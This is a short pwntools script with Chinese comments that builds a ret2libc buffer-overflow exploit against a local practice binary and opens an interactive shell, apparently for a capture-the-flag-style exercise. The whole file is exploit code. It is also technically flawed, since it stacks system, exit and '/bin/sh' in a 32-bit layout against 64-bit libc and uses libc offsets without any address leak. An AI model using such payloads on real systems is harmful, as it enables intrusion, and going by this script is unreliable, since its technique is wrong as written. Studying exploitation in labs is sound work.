from pwn import *

# 啟動目標程序
p = process('./ret2libc')

# 獲取函數地址
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_addr = libc.symbols['system']
exit_addr = libc.symbols['exit']
bin_sh_addr = next(libc.search(b'/bin/sh'))

# 確定偏移量（這裡假設是136）
offset = 136

# 構造payload
payload = b'A' * offset
payload += p64(system_addr)
payload += p64(exit_addr)
payload += p64(bin_sh_addr)

# 發送payload
p.sendline(payload)
p.interactive()
